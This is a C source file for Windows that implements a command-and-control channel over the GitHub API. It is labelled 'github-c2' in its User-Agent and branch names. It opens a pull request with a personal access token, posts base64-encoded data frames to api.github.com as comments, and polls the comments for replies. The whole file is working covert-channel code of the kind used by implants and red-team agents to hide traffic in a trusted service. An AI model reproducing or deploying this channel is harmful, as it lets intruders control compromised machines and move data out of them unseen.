#include "github.h"
#include "json.h"
#include "b64.h"
#include "protocol.h"

static int http_ok(int status)
{
	return status >= 200 && status < 300;
}

static unsigned int rd_u32le(const unsigned char *p)
{
	return (unsigned int)p[0]
		| ((unsigned int)p[1] << 8)
		| ((unsigned int)p[2] << 16)
		| ((unsigned int)p[3] << 24);
}

static int gh_assign_ids(gh_ctx_t *ctx)
{
	unsigned char raw[16];

	if (random_bytes(raw, sizeof(raw)) != 0) {
		return -1;
	}
	bytes_to_hex(raw, (int)sizeof(raw), ctx->session_id);
	xsnprintf(ctx->branch, sizeof(ctx->branch), "c2/%s", ctx->session_id);
	return 0;
}

int gh_init(gh_ctx_t *ctx)
{
	if (!ctx) {
		return -1;
	}
	memset(ctx, 0, sizeof(*ctx));

	ctx->session = WinHttpOpen(L"github-c2", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!ctx->session) {
		LOGERR("WinHttpOpen failed");
		return -1;
	}
	WinHttpSetTimeouts(ctx->session, 30000, 30000, 30000, 30000);
	ctx->connect = WinHttpConnect(ctx->session, L"api.github.com", 443, 0);
	if (!ctx->connect) {
		LOGERR("WinHttpConnect failed");
		return -1;
	}
	if (gh_assign_ids(ctx) != 0) {
		LOGERR("random id failed");
		return -1;
	}
	return 0;
}

void gh_close(gh_ctx_t *ctx)
{
	if (!ctx) {
		return;
	}
	if (ctx->connect) {
		WinHttpCloseHandle(ctx->connect);
		ctx->connect = NULL;
	}
	if (ctx->session) {
		WinHttpCloseHandle(ctx->session);
		ctx->session = NULL;
	}
}

int gh_http(gh_ctx_t *ctx, const char *method, const char *path, const char *json_body, char **resp, int *status_out)
{
	wchar_t *wmethod = NULL;
	wchar_t *wpath = NULL;
	wchar_t *whdr = NULL;
	HINTERNET req = NULL;
	char hdr[1024];
	DWORD blen;
	BOOL ok;
	DWORD status = 0;
	DWORD slen;
	DWORD cap = 8192;
	DWORD total = 0;
	char *buf = NULL;
	int rc = -1;

	if (resp) {
		*resp = NULL;
	}
	if (status_out) {
		*status_out = 0;
	}
	if (!ctx || !ctx->connect || !method || !path) {
		return -1;
	}

	wmethod = (wchar_t *)xmalloc((strlen(method) + 1) * sizeof(wchar_t));
	wpath = (wchar_t *)xmalloc((strlen(path) + 1) * sizeof(wchar_t));
	if (!wmethod || !wpath) {
		goto done;
	}
	ascii_to_wide(method, wmethod, (int)strlen(method) + 1);
	ascii_to_wide(path, wpath, (int)strlen(path) + 1);

	req = WinHttpOpenRequest(ctx->connect, wmethod, wpath, NULL, WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	if (!req) {
		LOGERR("WinHttpOpenRequest failed");
		goto done;
	}

	xsnprintf(hdr, sizeof(hdr),
		"Authorization: Bearer %s\r\n"
		"Accept: application/vnd.github+json\r\n"
		"User-Agent: github-c2\r\n"
		"X-GitHub-Api-Version: 2022-11-28\r\n"
		"Content-Type: application/json\r\n",
		GITHUB_PAT);
	whdr = (wchar_t *)xmalloc(sizeof(wchar_t) * (strlen(hdr) + 1));
	if (!whdr) {
		goto done;
	}
	ascii_to_wide(hdr, whdr, (int)strlen(hdr) + 1);
	WinHttpAddRequestHeaders(req, whdr, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);

	blen = json_body ? (DWORD)strlen(json_body) : 0;
	ok = WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
		(LPVOID)json_body, blen, blen, 0);
	if (!ok) {
		LOGERR("WinHttpSendRequest failed");
		goto done;
	}
	if (!WinHttpReceiveResponse(req, NULL)) {
		LOGERR("WinHttpReceiveResponse failed");
		goto done;
	}

	slen = sizeof(status);
	WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX, &status, &slen, WINHTTP_NO_HEADER_INDEX);
	if (status_out) {
		*status_out = (int)status;
	}

	buf = (char *)xmalloc(cap);
	if (!buf) {
		goto done;
	}
	for (;;) {
		DWORD avail = 0;
		DWORD got = 0;
		if (!WinHttpQueryDataAvailable(req, &avail)) {
			break;
		}
		if (avail == 0) {
			break;
		}
		if (total + avail + 1 > cap) {
			DWORD ncap = cap * 2;
			char *nbuf;
			while (ncap < total + avail + 1) {
				ncap *= 2;
			}
			if (ncap > 8u * 1024u * 1024u) {
				break;
			}
			nbuf = (char *)xmalloc(ncap);
			if (!nbuf) {
				break;
			}
			memcpy(nbuf, buf, total);
			xfree(buf);
			buf = nbuf;
			cap = ncap;
		}
		if (!WinHttpReadData(req, buf + total, avail, &got) || got == 0) {
			break;
		}
		total += got;
	}
	buf[total] = 0;
	if (resp) {
		*resp = buf;
		buf = NULL;
	}
	rc = 0;

done:
	xfree(buf);
	xfree(wmethod);
	xfree(wpath);
	xfree(whdr);
	if (req) {
		WinHttpCloseHandle(req);
	}
	return rc;
}

static int parse_comment_objects(const char *json, gh_comment_t **inout, int *n, int *cap)
{
	const char *p = json;
	int in_str = 0;
	int esc = 0;
	int depth = 0;
	const char *obj = NULL;

	if (!p) {
		return -1;
	}
	while (*p && *p != '[') {
		p++;
	}
	if (*p != '[') {
		return -1;
	}
	p++;

	for (; *p; p++) {
		if (in_str) {
			if (esc) {
				esc = 0;
			} else if (*p == '\\') {
				esc = 1;
			} else if (*p == '"') {
				in_str = 0;
			}
			continue;
		}
		if (*p == '"') {
			in_str = 1;
			continue;
		}
		if (*p == '{') {
			if (depth == 0) {
				obj = p;
			}
			depth++;
			continue;
		}
		if (*p == '}') {
			depth--;
			if (depth == 0 && obj) {
				int olen = (int)(p - obj + 1);
				char *copy;
				unsigned long long id = 0;
				char *body;

				copy = (char *)xmalloc((size_t)olen + 1);
				if (!copy) {
					return -1;
				}
				memcpy(copy, obj, (size_t)olen);
				copy[olen] = 0;
				json_get_u64(copy, "id", &id);
				body = json_dup_string(copy, "body");
				xfree(copy);
				if (body) {
					if (*n >= *cap) {
						int ncap = (*cap == 0) ? 16 : (*cap * 2);
						gh_comment_t *next = (gh_comment_t *)xmalloc(sizeof(gh_comment_t) * (size_t)ncap);
						if (!next) {
							xfree(body);
							return -1;
						}
						if (*inout && *n > 0) {
							memcpy(next, *inout, sizeof(gh_comment_t) * (size_t)(*n));
						}
						xfree(*inout);
						*inout = next;
						*cap = ncap;
					}
					(*inout)[*n].id = id;
					(*inout)[*n].body = body;
					(*n)++;
				}
				obj = NULL;
			}
			continue;
		}
		if (*p == ']' && depth == 0) {
			break;
		}
	}
	return 0;
}

int gh_list_comments(gh_ctx_t *ctx, gh_comment_t **out, int *count)
{
	int page;
	gh_comment_t *list = NULL;
	int n = 0;
	int cap = 0;
	int page_n;

	if (out) {
		*out = NULL;
	}
	if (count) {
		*count = 0;
	}
	if (!ctx || ctx->pr_number <= 0) {
		return -1;
	}

	for (page = 1; page <= 5; page++) {
		char path[384];
		char *resp = NULL;
		int status = 0;
		int before = n;

		xsnprintf(path, sizeof(path),
			"/repos/%s/%s/issues/%d/comments?per_page=100&page=%d&sort=created&direction=asc",
			GITHUB_OWNER, GITHUB_REPO, ctx->pr_number, page);
		if (gh_http(ctx, "GET", path, NULL, &resp, &status) != 0) {
			gh_free_comments(list, n);
			return -1;
		}
		if (!http_ok(status)) {
			xfree(resp);
			gh_free_comments(list, n);
			LOGERR("list comments HTTP %d", status);
			return -1;
		}
		if (parse_comment_objects(resp, &list, &n, &cap) != 0) {
			xfree(resp);
			gh_free_comments(list, n);
			return -1;
		}
		xfree(resp);
		page_n = n - before;
		if (page_n < 100) {
			break;
		}
	}

	if (out) {
		*out = list;
	} else {
		gh_free_comments(list, n);
	}
	if (count) {
		*count = n;
	}
	return 0;
}

void gh_free_comments(gh_comment_t *comments, int count)
{
	int i;
	if (!comments) {
		return;
	}
	for (i = 0; i < count; i++) {
		xfree(comments[i].body);
	}
	xfree(comments);
}

int gh_post_comment(gh_ctx_t *ctx, const char *body)
{
	int elen;
	char *esc = NULL;
	char *payload = NULL;
	char path[256];
	char *resp = NULL;
	int status = 0;
	int rc = -1;
	unsigned long long cid = 0;

	if (!ctx || !body || ctx->pr_number <= 0) {
		return -1;
	}
	elen = json_escape_len(body);
	esc = (char *)xmalloc((size_t)elen);
	payload = (char *)xmalloc((size_t)elen + 32);
	if (!esc || !payload) {
		goto done;
	}
	json_escape(body, esc, elen);
	xsnprintf(payload, (size_t)elen + 32, "{\"body\":\"%s\"}", esc);
	xsnprintf(path, sizeof(path), "/repos/%s/%s/issues/%d/comments",
		GITHUB_OWNER, GITHUB_REPO, ctx->pr_number);
	if (gh_http(ctx, "POST", path, payload, &resp, &status) != 0) {
		goto done;
	}
	if (!http_ok(status)) {
		LOGERR("post comment HTTP %d", status);
		goto done;
	}
	if (json_get_u64(resp ? resp : "", "id", &cid) && cid > ctx->last_comment_id) {
		ctx->last_comment_id = cid;
	}
	rc = 0;

done:
	xfree(esc);
	xfree(payload);
	xfree(resp);
	return rc;
}

int gh_bootstrap_pr(gh_ctx_t *ctx)
{
	char path[384];
	char *resp = NULL;
	int status = 0;
	char sha[80];
	char *payload = NULL;
	char dummy_b64[48];
	unsigned char dummy[16];
	unsigned long prn = 0;
	int attempt;

	if (!ctx) {
		return -1;
	}

	xsnprintf(path, sizeof(path), "/repos/%s/%s", GITHUB_OWNER, GITHUB_REPO);
	if (gh_http(ctx, "GET", path, NULL, &resp, &status) != 0 || !http_ok(status)) {
		LOGERR("get repo HTTP %d", status);
		xfree(resp);
		return -1;
	}
	if (!json_get_string(resp, "default_branch", ctx->default_branch, (int)sizeof(ctx->default_branch))) {
		strcpy(ctx->default_branch, "main");
	}
	xfree(resp);
	resp = NULL;

	xsnprintf(path, sizeof(path), "/repos/%s/%s/git/ref/heads/%s",
		GITHUB_OWNER, GITHUB_REPO, ctx->default_branch);
	if (gh_http(ctx, "GET", path, NULL, &resp, &status) != 0 || !http_ok(status)) {
		LOGERR("get ref HTTP %d", status);
		xfree(resp);
		return -1;
	}
	sha[0] = 0;
	if (!json_get_string(resp, "sha", sha, (int)sizeof(sha))) {
		LOGERR("missing sha");
		xfree(resp);
		return -1;
	}
	xfree(resp);
	resp = NULL;

	for (attempt = 0; attempt < 2; attempt++) {
		if (attempt > 0 && gh_assign_ids(ctx) != 0) {
			return -1;
		}
		payload = (char *)xmalloc(256);
		if (!payload) {
			return -1;
		}
		xsnprintf(payload, 256, "{\"ref\":\"refs/heads/%s\",\"sha\":\"%s\"}", ctx->branch, sha);
		xsnprintf(path, sizeof(path), "/repos/%s/%s/git/refs", GITHUB_OWNER, GITHUB_REPO);
		if (gh_http(ctx, "POST", path, payload, &resp, &status) != 0) {
			xfree(payload);
			xfree(resp);
			return -1;
		}
		xfree(payload);
		payload = NULL;
		if (http_ok(status)) {
			xfree(resp);
			resp = NULL;
			break;
		}
		xfree(resp);
		resp = NULL;
		if (status != 422 || attempt == 1) {
			LOGERR("create ref HTTP %d", status);
			return -1;
		}
	}

	if (random_bytes(dummy, sizeof(dummy)) != 0) {
		return -1;
	}
	if (b64_encode(dummy, (int)sizeof(dummy), dummy_b64, (int)sizeof(dummy_b64)) < 0) {
		return -1;
	}
	payload = (char *)xmalloc(512);
	if (!payload) {
		return -1;
	}
	xsnprintf(payload, 512,
		"{\"message\":\"%s\",\"content\":\"%s\",\"branch\":\"%s\"}",
		ctx->session_id, dummy_b64, ctx->branch);
	xsnprintf(path, sizeof(path), "/repos/%s/%s/contents/%s",
		GITHUB_OWNER, GITHUB_REPO, ctx->session_id);
	if (gh_http(ctx, "PUT", path, payload, &resp, &status) != 0 || !http_ok(status)) {
		LOGERR("put contents HTTP %d", status);
		xfree(payload);
		xfree(resp);
		return -1;
	}
	xfree(resp);
	resp = NULL;
	xfree(payload);

	payload = (char *)xmalloc(512);
	if (!payload) {
		return -1;
	}
	xsnprintf(payload, 512,
		"{\"title\":\"%s\",\"head\":\"%s\",\"base\":\"%s\"}",
		ctx->session_id, ctx->branch, ctx->default_branch);
	xsnprintf(path, sizeof(path), "/repos/%s/%s/pulls", GITHUB_OWNER, GITHUB_REPO);
	if (gh_http(ctx, "POST", path, payload, &resp, &status) != 0 || !http_ok(status)) {
		LOGERR("create pull HTTP %d", status);
		xfree(payload);
		xfree(resp);
		return -1;
	}
	xfree(payload);
	if (!json_get_u32(resp, "number", &prn) || prn == 0) {
		LOGERR("missing pull number");
		xfree(resp);
		return -1;
	}
	ctx->pr_number = (int)prn;
	xfree(resp);
	LOG("opened PR %d", ctx->pr_number);
	return 0;
}

int gh_post_frame(gh_ctx_t *ctx, const unsigned char *data, int datalen)
{
	int off;

	if (!ctx || !data || datalen < FRAME_LENGTH) {
		return -1;
	}

	for (off = 0; off < datalen; off += CHUNK_DATA_MAX) {
		int n = datalen - off;
		int b64len;
		char *body;

		if (n > CHUNK_DATA_MAX) {
			n = CHUNK_DATA_MAX;
		}
		b64len = b64_encoded_len(n);
		body = (char *)xmalloc((size_t)b64len + 1);
		if (!body) {
			return -1;
		}
		if (b64_encode(data + off, n, body, b64len + 1) < 0) {
			xfree(body);
			return -1;
		}
		if (gh_post_comment(ctx, body) != 0) {
			xfree(body);
			return -1;
		}
		xfree(body);
	}
	return 0;
}

int gh_wait_frame(gh_ctx_t *ctx, unsigned long long after_id, char *recvBuf, int recvBufMaxLen)
{
	int tries;
	int i;

	if (!ctx || !recvBuf || recvBufMaxLen < FRAME_LENGTH) {
		return -1;
	}

	for (tries = 0; tries < PROXY_MAX_TRIES; tries++) {
		gh_comment_t *comments = NULL;
		int count = 0;
		int got = 0;

		if (gh_list_comments(ctx, &comments, &count) != 0) {
			Sleep((DWORD)PROXY_POLL_MS);
			continue;
		}
		for (i = 0; i < count; i++) {
			unsigned char *raw;
			int maxraw;
			int decoded;
			int room;
			unsigned int plen;

			if (comments[i].id <= after_id || !comments[i].body) {
				continue;
			}
			maxraw = (int)strlen(comments[i].body);
			raw = (unsigned char *)xmalloc((size_t)maxraw + 16);
			if (!raw) {
				continue;
			}
			decoded = b64_decode(comments[i].body, maxraw, raw, maxraw + 16);
			if (decoded < 0) {
				xfree(raw);
				continue;
			}
			room = recvBufMaxLen - got;
			if (decoded > room) {
				xfree(raw);
				gh_free_comments(comments, count);
				return -1;
			}
			memcpy(recvBuf + got, raw, (size_t)decoded);
			got += decoded;
			xfree(raw);

			if (got < FRAME_LENGTH) {
				continue;
			}
			plen = rd_u32le((unsigned char *)recvBuf);
			if (plen > (unsigned int)(recvBufMaxLen - FRAME_LENGTH)) {
				gh_free_comments(comments, count);
				return -1;
			}
			if (got >= FRAME_LENGTH + (int)plen) {
				gh_free_comments(comments, count);
				return FRAME_LENGTH + (int)plen;
			}
		}
		gh_free_comments(comments, count);
		Sleep((DWORD)PROXY_POLL_MS);
	}
	LOGERR("timeout waiting for frame");
	return -1;
}
